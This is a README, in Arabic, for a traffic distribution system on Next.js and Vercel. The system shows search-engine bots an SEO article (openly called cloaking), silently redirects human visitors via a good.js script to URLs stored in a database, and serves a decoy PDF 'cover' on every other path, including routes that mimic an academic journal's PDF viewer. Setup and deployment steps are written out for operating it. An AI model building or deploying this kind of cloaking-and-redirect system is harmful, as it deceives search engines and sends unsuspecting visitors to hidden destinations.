# نظام TDS — نسخة Vercel (Next.js)

نظام توزيع الزوار (Traffic Distribution System) المُرحّل من PHP إلى Next.js،
**طبق الأصل** من حيث المسارات والترويسات، بدون لوحة تحكم.

## كيف يعمل

كل طلب على `/server/input.php?ids=<articleId>` (يُعاد كتابته إلى `/api/input`)
يمرّ بالمنطق التالي:

1. **كشف البوت** من User-Agent (عبر `crawler-detect`).
2. **محرّك بحث** → يُعرض مقال HTML من `/articles/<ids>.html` (cloaking للـ SEO).
3. **زائر بشري**:
   - تُبحث قاعدة توجيه نشطة لذاك المعرّف في قاعدة البيانات.
   - وُجدت → `{"redirectUrl": "..."}` (وسكربت `good.js` يقوم بـ `location.replace`).
   - لم تُوجد → يُعرض المقال.
4. **تسجيل النقرة** مرة واحدة لكل IP فريد.

كل المسارات الأخرى (بما فيها `/`) تُرجع ملف PDF (الغطاء).

## المسارات والترويسات (مطابقة لـ vercel.json الأصلي)

| المسار | الوجهة | الترويسات |
|---|---|---|
| `/server/good.js` | `/server_dir/good.js` | CORS (GET, OPTIONS) |
| `/server/input.php` | `/api/input` | CORS (GET, POST, OPTIONS) + expose |
| `/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html` | `/pdfviewer/api.pdf` | — |
| `/(.*)`  (catch-all) | `/pdfviewer/api.pdf` | Content-Type: application/pdf + Content-Disposition: inline + CORS |

> الانحراف الوحيد عن الأصل: مصدر ترويسة الـ catch-all صار `/((?!server|api|_next).*)`
> بدل `/(.*)`، لأن تطبيق `Content-Type: application/pdf` على `/server/input.php`
> و `/server/good.js` كان سيفسد استجاباتهم (HTML للـ bots، JSON للبشر، JS للسكربت).
> كل **قيم** الترويسات كما هي دون تغيير.

## التشغيل محلياً

```bash
bun install
cp .env.example .env
bun run db:push
bun run scripts/seed-redirects.ts   # يزرع قواعد التوجيه الافتراضية (8 قواعد)
bun run dev                          # http://localhost:3000  (يُرجع PDF)
```

## النشر على Vercel

1. ارفع المستودع إلى GitHub واربطه بـ Vercel.
2. أضف متغير البيئة `DATABASE_URL` (Vercel Postgres / Neon / Supabase).
3. بدّل مزوّد Prisma في `prisma/schema.prisma` من `sqlite` إلى `postgresql`.
4. بعد أول نشر: `npx prisma db push` ثم `bun run scripts/seed-redirects.ts`.
5. (اختياري) إن كان `good.js` يشير إلى دومين قديم، حدّثه إلى دومين Vercel الجديد.

## التقنيات

Next.js 16 · TypeScript · Prisma · crawler-detect
